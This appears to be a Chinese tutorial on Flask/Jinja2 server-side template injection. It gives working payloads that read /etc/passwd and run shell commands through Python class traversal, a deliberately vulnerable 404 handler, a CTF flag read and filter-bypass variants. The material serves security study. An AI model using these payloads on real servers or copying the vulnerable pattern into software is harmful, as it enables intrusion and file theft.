

# (Python flask模板注入)[[从零学习flask模板注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/column/187845.html)]

> flask基础

### 路由(route)

```
from flask import flask  
@app.route('/index/') 
def hello_word():    
	return 'hello word'`
```

`route`装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问`http://127.0.0.1：5000/index`的时候，flask会返回hello word。

### 渲染方法(render)

render_template()是用来渲染一个指定的文件的。

`return render_template('index.html')`

render_template_string则是用来渲染一个字符串的。

`html = '<h1>This is index page</h1>' `

`return render_template_string(html)`

### SSTI文件读取/命令执行

#### 基础知识

在Jinja2模板引擎中，`{{}}`是变量包裹标识符。`{{}}`并不仅仅可以传递变量，还可以执行一些简单的表达式。

{{7+7}}=14

{{config}}显示全局变量

### 漏洞利用

找到父类，再寻找子类-->找到命令执行或者文件操作模块

魔术方法：

```
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```

1. 获取字符串的类对象

```
>>>''.__class__      //两个单引号
<type 'str'>
```

2. 寻找基类

```
>>>''.__class__.mro_
(<type 'str'>,<type 'basestring'>,<type 'object'>)
```

3. 寻找可用引用

```
>>>''.__class__.mro__[2].__subclasses__()
<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'functools.partial'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'collections.deque'>, <type 'deque_iterator'>, <type 'deque_reverse_iterator'>, <type 'itertools.combinations'>, <type 'itertools.combinations_with_replacement'>, <type 'itertools.cycle'>, <type 'itertools.dropwhile'>, <type 'itertools.takewhile'>, <type 'itertools.islice'>, <type 'itertools.starmap'>, <type 'itertools.imap'>, <type 'itertools.chain'>, <type 'itertools.compress'>, <type 'itertools.ifilter'>, <type 'itertools.ifilterfalse'>, <type 'itertools.count'>, <type 'itertools.izip'>, <type 'itertools.izip_longest'>, <type 'itertools.permutations'>, <type 'itertools.product'>, <type 'itertools.repeat'>, <type 'itertools.groupby'>, <type 'itertools.tee_dataobject'>, <type 'itertools.tee'>, <type 'itertools._grouper'>, <type '_thread._localdummy'>, <type 'thread._local'>, <type 'thread.lock'>, <type 'Struct'>, <type '_json.Scanner'>, <type '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <type 'time.struct_time'>, <class 'threading._Verbose'>, <type 'cPickle.Unpickler'>, <type 'cPickle.Pickler'>, <type 'cStringIO.StringO'>, <type 'cStringIO.StringI'>, <class 'string.Template'>, <class 'string.Formatter'>, <type '_ssl._SSLContext'>, <type '_ssl._SSLSocket'>, <class 'socket._closedsocket'>, <type '_socket.socket'>, <type 'method_descriptor'>, <class 'socket._socketobject'>, <class 'socket._fileobject'>, <class 'urlparse.ResultMixin'>, <class 'contextlib.GeneratorContextManager'>, <class 'contextlib.closing'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'jinja2.nodes.EvalContext'>, <type '_hashlib.HASH'>, <class 'jinja2.nodes.Node'>, <type '_random.Random'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContextBase'>, <class 'jinja2.runtime.LoopContextIterator'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'numbers.Number'>, <class 'decimal.Decimal'>, <class 'decimal._ContextManager'>, <class 'decimal.Context'>, <class 'decimal._WorkRep'>, <class 'decimal._Log10Memoize'>, <type '_ast.AST'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <type '_io._IOBase'>, <type '_io.IncrementalNewlineDecoder'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'logging.LogRecord'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <type 'datetime.date'>, <type 'datetime.timedelta'>, <type 'datetime.time'>, <type 'datetime.tzinfo'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'email.LazyImporter'>, <class 'calendar.Calendar'>, <class 'werkzeug.urls.Href'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.middleware.dispatcher.DispatcherMiddleware'>, <class 'werkzeug.middleware.http_proxy.ProxyMiddleware'>, <class 'werkzeug.middleware.shared_data.SharedDataMiddleware'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'werkzeug.exceptions.Aborter'>, <class 'uuid.UUID'>, <type 'CArgObject'>, <type '_ctypes.CThunkObject'>, <type '_ctypes._CData'>, <type '_ctypes.CField'>, <type '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <type 'select.epoll'>, <class 'subprocess.Popen'>, <class 'itsdangerous._json._CompactJSON'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'ast.NodeVisitor'>, <class 'difflib.HtmlDiff'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <type 'unicodedata.UCD'>, <type 'array.array'>, <class 'jinja2.debug.TracebackFrameProxy'>, <class 'jinja2.debug.ProcessedTraceback'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <type 'method-wrapper'>


可以找到一个<type 'file'>   //可以实现文件读取
```

4. 利用

```
''.__class__.__mro__[2].__subclasses()[40]('/etc/passwd').read()
```

5. 命令执行

<class 'site._Printer'>类型可以进行命令的执行：

查看该目录下的文件：

```
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
```

```
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
```

```
fl4g index.py   #攻防题
```

```python
from flask import Flask,request,render_template_string from urllib import unquote 
app = Flask(__name__) 
@app.route("/") 
def hello(): 
    return "python template injection" @app.errorhandler(404) 
def page_not_found(error): 
    url = unquote(request.url) 
    return render_template_string("<h1>URL %s not found</h1><br/>"%url), 404 		#漏洞原因
if __name__ == '__main__': app.run(debug=False, host='0.0.0.0')
```

根据上面的<type 'flie'>进行查找：

```
{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}
```

### waf绕过

1. 过滤`[]`和`.`

```
pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()

若.也被过滤，使用原生JinJa2函数|attr()
将request.__class__改成request|attr("__class__")
```

